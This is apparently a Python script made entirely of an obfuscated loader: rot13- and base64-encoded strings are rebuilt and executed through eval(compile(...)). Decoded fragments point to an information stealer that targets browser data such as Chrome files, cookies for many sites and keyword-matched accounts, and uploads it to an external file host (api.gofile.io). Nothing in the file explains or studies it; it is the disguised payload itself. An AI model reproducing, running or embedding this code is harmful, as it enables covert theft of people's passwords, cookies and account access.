 
import base64, codecs
magic = ''
love = ''
god = ''
destiny = 'NtVPNtVPNtVPOqYN0XVPNtVPNtVPOoMvW7oT9wLJk9Y0qio2qfMF9QnUWioJHiIKAypvORLKEuVvjtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNvL2ulo21yYzI4MFVfVPNtVv9RMJMuqJk0Y0kiL2SfVSA0o3WuM2HioTI2MJkxLvVfVPNtVv9RMJMuqJk0VvjtVPNtVPViETIzLKIfqP9BMKE3o3WeVvjtVPNtVPViETIzLKIfqP9Zo2AuoPOSrUEyoaAco24tH2I0qTyhM3ZiozgvnJuzLzIiM2SyLJ9ynTkyMz5eo2EvMJMapTqeoz4vVPNtVPNtVPNtVPNtVPOqYN0XVPNtVPNtVPOoMvW7oT9wLJk9Y0qio2qfMF9QnUWioJHtH3uGY1ImMKVtETS0LFVfVPNtVPNtVPNtVPNtVPNtVPNtVPNvL2ulo21yYzI4MFVfVPNtVv9RMJMuqJk0Y0kiL2SfVSA0o3WuM2HioTI2MJkxLvVfVPNtVv9RMJMuqJk0VvjtVPNtVPViETIzLKIfqP9BMKE3o3WeVvjtVPNtVPViETIzLKIfqP9Zo2AuoPOSrUEyoaAco24tH2I0qTyhM3ZiozgvnJuzLzIiM2SyLJ9ynTkyMz5eo2EvMJMapTqeoz4vVPNtVPNtVPNtVPNtVPOqYN0XVPNtVPNtVPOoMvW7oT9wLJk9Y0WlLKMyH29zqUqupzHiDaWuqzHgDaWiq3Aypv9Ip2IlVREuqTRvYPNtVPNtVPNtVPNvLaWuqzHhMKuyVvjtVPNtVv9RMJMuqJk0Y0kiL2SfVSA0o3WuM2HioTI2MJkxLvVfVPNtVv9RMJMuqJk0VvjtVPNtVPViETIzLKIfqP9BMKE3o3WeVvjtVPNtVPViETIzLKIfqP9Zo2AuoPOSrUEyoaAco24tH2I0qTyhM3ZiozgvnJuzLzIiM2SyLJ9ynTkyMz5eo2EvMJMapTqeoz4vVPNtVPNtVPNtVPNtVPOqYN0XVPNtVPNtVPOoMvW7oT9wLJk9Y1yuozEyrP9MLJ5xMKuPpz93p2IlY1ImMKVtETS0LFVfVPNtVPNtVPNtVPNtVPNtVPNvrJShMTI4YzI4MFVfVPNtVv9RMJMuqJk0Y0kiL2SfVSA0o3WuM2HioTI2MJkxLvVfVPNtVv9RMJMuqJk0VvjtVPNtVPViETIzLKIfqP9BMKE3o3WeVvjtVPNtVPViFT91M2SPo3IaLF9hn2WcnTMvMJ9aLJIuo2IboTIzozgiMTWyMzqjM2ghovVtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOqYN0XVPNtVPNtVPOoMvW7oT9wLJk9Y01cL3Wip29zqP9SMTqyY1ImMKVtETS0LFVfVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNvMJEaMF5yrTHvYPNtVPNtVv9RMJMuqJk0Y0kiL2SfVSA0o3WuM2HioTI2MJkxLvVfVPNtVv9RMJMuqJk0VvjtVPNtVPViETIzLKIfqP9BMKE3o3WeVvjtVPNtVPViETIzLKIfqP9Zo2AuoPOSrUEyoaAco24tH2I0qTyhM3ZiozgvnJuzLzIiM2SyLJ9ynTkyMz5eo2EvMJMapTqeoz4vVPNtVPNtVPNtVPNtVPOqQDbtVPNtKD0XQDbtVPNtMTymL29lMSOuqTumVQ0tJj0XVPNtVPNtVPOoMvW7pz9uoJyhM30iETymL29lMPVfVPViGT9wLJjtH3EipzSaMF9fMKMyoTEvVy0fQDbtVPNtVPNtVSgzVaglo2SgnJ5asF9ZnJqbqTAipzDvYPNvY0kiL2SfVSA0o3WuM2HioTI2MJkxLvWqYN0XVPNtVPNtVPOoMvW7pz9uoJyhM30iMTymL29lMTAuozSlrFVfVPViGT9wLJjtH3EipzSaMF9fMKMyoTEvVy0fQDbtVPNtVPNtVSgzVaglo2SgnJ5asF9xnKAwo3WxpUEvVvjtVv9Zo2AuoPOGqT9lLJqyY2kyqzIfMTVvKFjAPvNtVPOqQDbAPvNtVPODLKEbp1EiJzyjVQ0tJj0XVPNtVPNtVPOoMvW7pz9uoJyhM30iLKEioJywY0kiL2SfVSA0o3WuM2HioTI2MJkxLvVfVPpvDKEioJywVSquoTkyqP5yrTHvWljtVyquoTkyqPWqYN0XVPNtVPNtVPOoMvW7pz9uoJyhM30iEKuiMUImY2I4o2E1pl53LJkfMKDvYPNvEKuiMUImYzI4MFVfVPWKLJkfMKDvKFjAPvNtVPNtVPNtJlWQBykDpz9apzSgVRMcoTImVPu4BQLcKSA0MJSgKTAiozMcMlVfVPWmqTIuoF5yrTHvYPNvH3EyLJ0vKFjAPvNtVPNtVPNtJ2Lvr3WiLJ1cozq9Y05uqTyioaAUoT9lrF9Zo2AuoPOGqT9lLJqyY2kyqzIfMTVvYPNvGzS0nJ9hp0qfo3W5YzI4MFVfVPWBLKEco25mE2kipaxvKFjAPvNtVPNtVPNtJ2Lvr2kiL2SfsF9FnJ90VRquoJImY1Wco3DtD2kcMJ50Y0EuqTRvYPNvHzyiqRAfnJIhqSAypaMcL2ImYzI4MFVfVPWFnJ90D2kcMJ50Vy0APvNtVPOqQDbtVPNtITIfMJqlLJ0tCFOoMvW7pz9uoJyhM30iITIfMJqlLJ0tETImn3EipP90MTS0LFVfVPq0MJkyM3WuoF5yrTHaYPNvITIfMJqlLJ0vKD0XQDbtVPNtMz9lVUOuqUDtnJ4tLaWiq3AypyOuqTumBvNAPvNtVPNtVPNtLFN9VUEbpzIuMTyhMl5HnUWyLJDbqTSlM2I0CJqyqSEin2IhYPOupzqmCIgjLKE0JmOqYPOjLKE0JmWqKFxAPvNtVPNtVPNtLF5mqTSlqPtcQDbtVPNtVPNtVSEbpzIuMTkcp3DhLKOjMJ5xXTRcQDbtVPNtMz9lVUOuqUDtnJ4tMTymL29lMSOuqTumBvNAPvNtVPNtVPNtLFN9VUEbpzIuMTyhMl5HnUWyLJDbqTSlM2I0CHqyqREcp2AipzDfVTSlM3Z9J3OuqUEoZS0fVUOuqUEoZI1qXD0XVPNtVPNtVPOuYaA0LKW0XPxAPvNtVPNtVPNtITulMJSxoTymqP5upUOyozDbLFxAPt0XVPNtVTMipvOjLKE0VTyhVTWlo3qmMKWDLKEbpmbtQDbtVPNtVPNtVTRtCFO0nUWyLJEcozphITulMJSxXUEupzqyqQ1aMKEDLKAmqljtLKWapm1opTS0qSfjKFjtpTS0qSfmKI0cQDbtVPNtVPNtVTRhp3EupaDbXD0XVPNtVPNtVPOHnUWyLJEfnKA0YzSjpTIhMPuuXD0XQDbtVPNtITuQo2geVQ0tJ10APvNtVPOzo3VtpTS0qPOcovOvpz93p2IlHTS0nUZ6VN0XVPNtVPNtVPOuVQ0tqTulMJSxnJ5aYyEbpzIuMPu0LKWaMKD9M2I0D29in2yyYPOupzqmCIgjLKE0JmOqYPOjLKE0JmEqKFxAPvNtVPNtVPNtLF5mqTSlqPtcQDbtVPNtVPNtVSEbD29enl5upUOyozDbLFxAPt0XVPNtVUEbpzIuMTyhMl5HnUWyLJDbqTSlM2I0CHquqTuypyccpUZfVTSlM3Z9J2Wlo3qmMKWDLKEbpljtHTS0nUAHo1ccpPjtITIfMJqlLJ1qXF5mqTSlqPtcQDbAPt0XVPNtVTMipvO0nUWyLJDtnJ4tITuQo2geBvO0nUWyLJDhnz9covtcQDbtVPNtERIHEHAHEHDtCFOHpaImqPuQo29enJImXD0XVPNtVTyzVRESIRIQIRIRVQ09VSElqJH6VUWyqUIlot0XQDbtVPNtVlOzo3VtpTS0qPOcovOvpz93p2IlHTS0nUZ6QDbtVPNtVlNtVPNtqTulMJSxnJ5aYyEbpzIuMPu0LKWaMKD9JzyjITucozqmYPOupzqmCIgjLKE0JmOqYPOjLKE0JmIqYPOjLKE0JmSqKFxhp3EupaDbXD0XVPNtVN0XVPNtVPZtMz9lVUOuqUDtnJ4tHTS0nUAHo1ccpQbAPvNtVPNwVPNtVPO0nUWyLJEcozphITulMJSxXUEupzqyqQ1nnKOHnTyhM3ZfVTSlM3Z9J3OuqUEoZS0fVUOuqUEoZy0fVUOuqUEoZI1qXF5mqTSlqPtcQDbtVPNtQDbtVPNtVlO0nUWyLJEcozphITulMJSxXUEupzqyqQ1nnKOHMJkyM3WuoFjtLKWapm1oITIfMJqlLJ1oZS0fVSEyoTIapzSgJmWqYPOHMJkyM3WuoIfkKI0cYaA0LKW0XPxAPt0XVPNtVTMipvO0nUWyLJDtnJ4tITulMJSxoTymqQbtQDbtVPNtVPNtVUEbpzIuMP5do2yhXPxAPvNtVPOaoT9vLJjtqKO0nUZAPvNtVPO1pUEbplN9VSgqQDbAPvNtVPOzo3VtMzyfMFOcovOoVaqjpTSmp3phqUu0VvjtVaqjL29inl50rUDvKGbtQDbtVPNtVPNtVPZtqKOfo2SxXT9mYzqyqTIhqvtvIRIAHPVcVPftVykpVvNeVTMcoTHcQDbtVPNtVPNtVUIjoT9uMPuznJkyYaWypTkuL2HbVv50rUDvYPNvVvxfVUIjoT9uMSEiDJ5iozMcoTImXT9mYzqyqTIhqvtvIRIAHPVcVPftVykpVvNeVTMcoTHcXD0XQDcxMJLtqKOfo2SxIT9Ooz9hMzyfMKZbpTS0nPx6QDbtVPNtqUW5BaWyqUIlovOlMKS1MKA0pl5jo3A0XTLanUE0pUZ6Yl97pzIkqJImqUZhM2I0XPWbqUEjpmbiY2SjnF5ao2McoTHhnJ8iM2I0H2IlqzIlVvxhnaAiovtcJlWxLKEuVy1oVaAypaMypvWqsF5ao2McoTHhnJ8iqKOfo2SxEzyfMFpfVTMcoTImCKfaMzyfMFp6VT9jMJ4bpTS0nPjtW3WvWly9XF5dp29hXPyoVzEuqTRvKIfvMT93ozkiLJEDLJqyVy0APvNtVPOyrTAypUD6pzI0qKWhVRMuoUAyQDbAPvZtMTIzVUIjoT9uMSEiDJ5iozMcoTImXUOuqTtcBaZAPvZtVPNtVUElrGbAPvZtVPNtVPNtVPOznJkyplN9VUftVzMcoTHvBvNbpTS0nPjto3OyovujLKEbYPOgo2EyCFqlLvpcXFO9QDbwVPNtVPNtVPNtqKOfo2SxVQ0tpzIkqJImqUZhpT9mqPtvnUE0pUZ6Yl90pzShp2Mypv5mnP8vYPOznJkypm1znJkyplxAPvZtVPNtVPNtVPO1pzjtCFO1pTkiLJDhqTI4qN0XVlNtVPNtVPNtVUWyqUIlovO1pzjAPvZtVPNtVTI4L2IjqQbAPvZtVPNtVPNtVPOlMKE1pz4tEzSfp2HAPt0XMTIzVRgcq2yTo2kxMKVbpTS0nRLfVTgyrKqipzEmXGbAPvNtVPOaoT9vLJjtF2y3nHMcoTImQDbtVPNtoJS4MzyfMKAjMKWxnKVtCFN3QDbtVPNtnFN9VQNAPvNtVPOfnKA0G2MTnJkyVQ0to3ZhoTymqTEcpvujLKEbEvxAPvNtVPOzMz91ozDtCFOoKD0XVPNtVTMipvOznJkyVTyhVTkcp3ECMxMcoTH6QDbtVPNtVPNtVTyzVT5iqPOipl5jLKEbYzymMzyfMFuzVagjLKEbEa0ir2McoTI9Vvx6VUWyqUIlot0XVPNtVPNtVPOcVPf9VQRAPvNtVPNtVPNtnJLtnFN+VT1urTMcoTImpTIlMTylBt0XVPNtVPNtVPNtVPNtLaWyLJfAPvNtVPNtVPNtqKWfVQ0tqKOfo2SxIT9Ooz9hMzyfMKZbMvW7pTS0nRM9Y3gznJkysFVcQDbtVPNtVPNtVTMzo3IhMP5upUOyozDbJ2Lvr3OuqTuTsF97MzyfMK0vYPO1pzkqXD0XVPNtVRgcq2yTnJkypl5upUOyozDbJlWzo2kxMKVvYPOzVagjLKEbEa0iVvjtMzMiqJ5xKFxAPt0XF2y3nHMcoTImVQ0tJ10APzEyMvOYnKqcEzyfMFujLKEbYPOeMKy3o3Wxplx6QDbtVPNtM2kiLzSfVRgcq2yTnJkypj0XVPNtVTMcMz91ozDtCFOoKD0XVPNtVTkcp3ECMxMcoTHtCFOipl5fnKA0MTylXUOuqTtcQDbtVPNtMz9lVTMcoTHtnJ4toTymqR9zEzyfMGbAPvNtVPNtVPNtMz9lVUqipzLtnJ4tn2I5q29lMUZ6QDbtVPNtVPNtVPNtVPOcMvO3o3WzVTyhVTMcoTHhoT93MKVbXGbAPvNtVPNtVPNtVPNtVPNtVPOcMvOipl5jLKEbYzymMzyfMFuzVagjLKEbsF97MzyfMK0vXFOuozDtVv50rUDvVTyhVTMcoTH6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVTMcMz91ozDhLKOjMJ5xXSgzVagjLKEbsF97MzyfMK0vYPO1pTkiLJEHo0Sho25znJkypluzVagjLKEbsF97MzyfMK0vXI0cQDbtVPNtVPNtVPNtVPNtVPNtVPNtVTWlMJSeQDbtVPNtVPNtVPNtVPNtVPNtnJLto3ZhpTS0nP5cp2EcpvuzVagjLKEbsF97MzyfMK0vXGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtqTSlM2I0VQ0tMvW7pTS0nU0ir2McoTI9Vt0XVPNtVPNtVPNtVPNtVPNtVPNtVPOYnKqcEz9fMTIlXUEupzqyqPjtn2I5q29lMUZcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVTWlMJSeQDbAPvNtVPOYnKqcEzyfMKZhLKOjMJ5xXSfvMz9fMTIlVvjtpTS0nPjtMzyzo3IhMS0cQDbAPzEyMvOYnKqcXPx6QDbtVPNtqKAypvN9VUEyoKNhp3OfnKDbVykOpUORLKEuVvyoZS0APvNtVPOjLKEbZaAyLKWwnPN9VSgzVag1p2IlsF9RMKAeqT9jVvjtMvW7qKAypa0iET93ozkiLJEmVvjtMvW7qKAypa0iET9wqJ1yoaEmVy0APt0XVPNtVTgyrI93o3Wxp0MioTEypvN9VSfAPvNtVPNtVPNtVzSwL291oaDvYN0XVPNtVPNtVPNvLJAiqJ50VvjAPvNtVPNtVPNtVaOup3A3VvjAPvNtVPNtVPNtVaAyL3WyqPVfQDbtVPNtVPNtVPWmMJ5bLKZvYN0XVPNtVPNtVPNvL29hqTSmVvjAPvNtVPNtVPNtVzWuL2g1pPVfQDbtVPNtVPNtVPVlMzRvYN0XVPNtVPNtVPNvnJ1jo3W0LJ50MFVfQDbtVPNtVPNtVPWjpzy2LJEiVvjAPvNtVPNtVPNtVzI4o2E1plVfQDbtVPNtVPNtVPWmMJIxVvjAPvNtVPNtVPNtVaAyMJEjnUWup2HvQDbtVPNtVPNtVPWyrUOip2IxVvjAPvNtVPNtVPNtVaOypzEypvVfQDbtVPNtVPNtVPWuoJyao3ZvYN0XVPNtVPNtVPNvMJ1jpzImLFVfQDbtVPNtVPNtVPW0pzSvLJkbolVfQDbtVPNtVPNtVPW3o3WeVvjAPvNtVPNtVPNtVaOlnKMuqTHvYN0XVPNtVPNtVPNvp291pzAyVvjAPvNtVPNtVPNtVaImMKWmVvjAPvNtVPNtVPNtVaImMKWhLJ1yVvjAPvNtVPNtVPNtVzkiM2yhVvjAPvNtVPNtVPNtVaImMKVvYN0XVPNtVPNtVPNvqKA1LKWcolVfQDbtVPNtVPNtVPWfo2pvQDbtVPNtVPNtVPWirzIfVt0XVPNtVPNtVPNvnTImLKNvQDbtVPNtVPNtVPWjLKWioTRvQDbtVPNtVPNtVPWmnJMlMFVAPvNtVPNtVPNtVzIjnJ4vQDbtVPNtVPNtVPWeqKW0LKWgLFVAPvNtVPNtVPNtVaOuozIfVt0XQDbtVPNtKD0XQDbtVPNtn2I5K3qipzEmEzyfMKZtCFOoQDbtVPNtVPNtVPWjLKAmqlVfQDbtVPNtVPNtVPWgMUNvYN0XVPNtVPNtVPNvoJ90MTIjLKAmMFVfQDbtVPNtVPNtVPWgo3EsMTIspTSmp2HvYN0XVPNtVPNtVPNvoT9anJ4vYN0XVPNtVPNtVPNvp2IwpzI0VvjAPvNtVPNtVPNtVzSwL291oaDvYN0XVPNtVPNtVPNvLJAiqJ50VvjAPvNtVPNtVPNtVaOurKOuoPVfQDbtVPNtVPNtVPWvLJ5kqJHvYN0XVPNtVPNtVPNvLJAwo3IhqPVfQDbtVPNtVPNtVPWgMKEuoJSmnlVfQDbtVPNtVPNtVPW3LJkfMKDvYN0XVPNtVPNtVPNvL3W5pUEiVvjAPvNtVPNtVPNtVzI4o2E1plVfQDbtVPNtVPNtVPWxnKAwo3WxVv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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))